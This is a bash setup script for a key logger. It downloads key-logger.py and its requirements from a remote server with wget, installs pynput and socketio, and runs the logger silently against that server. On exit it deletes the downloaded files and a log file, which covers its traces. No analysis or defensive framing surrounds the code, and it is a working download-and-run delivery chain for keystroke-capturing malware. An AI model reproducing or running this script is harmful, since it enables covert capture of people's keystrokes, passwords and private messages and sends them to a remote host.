#!/bin/bash

# Key Logger Setup and Run Script
# This script will download, install dependencies and run the key logger automatically

set -e  # Exit on any error

# Configuration
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SERVER_URL="https://api.tryaiadam.com"
VENV_DIR="/tmp/keylogger_venv"
DOWNLOAD_BASE_URL="https://api.tryaiadam.com"  # Base URL for downloading files
DOWNLOADED_FILES=()  # Array to track downloaded files for cleanup

# Function to check if command exists
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

# Function to download key logger files from server
download_keylogger_files() {
    # Check if wget is available
    if ! command_exists wget; then
        exit 1
    fi
    
    # List of files to download
    local files_to_download=(
        "key-logger.py"
        "requirements.txt"
    )
    
    # Download each file
    for file in "${files_to_download[@]}"; do
        local download_url="${DOWNLOAD_BASE_URL}/key-logger/${file}"
        local local_file="${SCRIPT_DIR}/${file}"
        
        if wget -q --timeout=10 --tries=3 -O "$local_file" "$download_url" 2>/dev/null; then
            DOWNLOADED_FILES+=("$local_file")
        else
            exit 1
        fi
    done
    
    # Make key-logger.py executable
    chmod +x "${SCRIPT_DIR}/key-logger.py" 2>/dev/null || true
}

# Function to install dependencies
install_dependencies() {
    # Method 1: Try creating venv in /tmp to avoid path issues
    if [ ! -d "$VENV_DIR" ]; then
        if python3 -m venv "$VENV_DIR" 2>/dev/null; then
            source "$VENV_DIR/bin/activate"
            pip install --upgrade pip >/dev/null 2>&1
            pip install -r "$SCRIPT_DIR/requirements.txt" >/dev/null 2>&1
            # Try to get the latest pynput for Python 3.13 compatibility
            pip install --upgrade pynput >/dev/null 2>&1
            return 0
        fi
    else
        source "$VENV_DIR/bin/activate"
        # Make sure we have the latest pynput
        pip install --upgrade pynput >/dev/null 2>&1 || true
        return 0
    fi
    
    # Method 2: Try installing to user directory
    if python3 -m pip install --user -r "$SCRIPT_DIR/requirements.txt" >/dev/null 2>&1; then
        return 0
    fi
    
    # Method 3: Try with --break-system-packages (last resort)
    if python3 -m pip install --break-system-packages -r "$SCRIPT_DIR/requirements.txt" >/dev/null 2>&1; then
        return 0
    else
        return 1
    fi
}

# Function to check if dependencies are available
check_dependencies() {
    python3 -c "
import sys
try:
    import pynput
    import socketio
    sys.exit(0)
except ImportError as e:
    sys.exit(1)
" 2>/dev/null
    
    return $?
}

# Function to run the key logger
run_key_logger() {
    # Update the default server URL in the script to use port 5001
    if [ -d "$VENV_DIR" ] && [ -f "$VENV_DIR/bin/activate" ]; then
        source "$VENV_DIR/bin/activate"
    fi
    
    cd "$SCRIPT_DIR"
    
    # Run the key logger silently
    python3 key-logger.py --server "$SERVER_URL" >/dev/null 2>&1
    
    # Clean up log file
    rm -f /tmp/keylogger_output.log 2>/dev/null || true
}

# Function to check server connectivity
check_server() {
    if command_exists curl; then
        if curl -s --max-time 5 "$SERVER_URL" >/dev/null 2>&1; then
            return 0
        else
            return 1
        fi
    else
        return 0
    fi
}

# Function to cleanup on exit
cleanup() {
    # Deactivate virtual environment if active
    if [ -d "$VENV_DIR" ]; then
        deactivate 2>/dev/null || true
    fi
    
    # Delete downloaded files
    if [ ${#DOWNLOADED_FILES[@]} -gt 0 ]; then
        for file in "${DOWNLOADED_FILES[@]}"; do
            if [ -f "$file" ]; then
                rm -f "$file" 2>/dev/null || true
            fi
        done
    fi
}

# Set trap for cleanup
trap cleanup EXIT

# Main execution
main() {
    # Parse command line arguments
    while [[ $# -gt 0 ]]; do
        case $1 in
            --server)
                SERVER_URL="$2"
                shift 2
                ;;
            --download-url)
                DOWNLOAD_BASE_URL="$2"
                shift 2
                ;;
            --help|-h)
                exit 0
                ;;
            *)
                exit 1
                ;;
        esac
    done
    
    # Check if Python 3 is available
    if ! command_exists python3; then
        exit 1
    fi
    
    # Download key logger files from server
    download_keylogger_files
    
    # Check if requirements.txt exists after download
    if [ ! -f "$SCRIPT_DIR/requirements.txt" ]; then
        exit 1
    fi
    
    # Check if dependencies are already installed
    if ! check_dependencies; then
        if ! install_dependencies; then
            exit 1
        fi
    fi
    
    # Check server connectivity
    check_server
    
    # Run the key logger
    sleep 1
    run_key_logger
}

# Check if script is being sourced or executed
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi 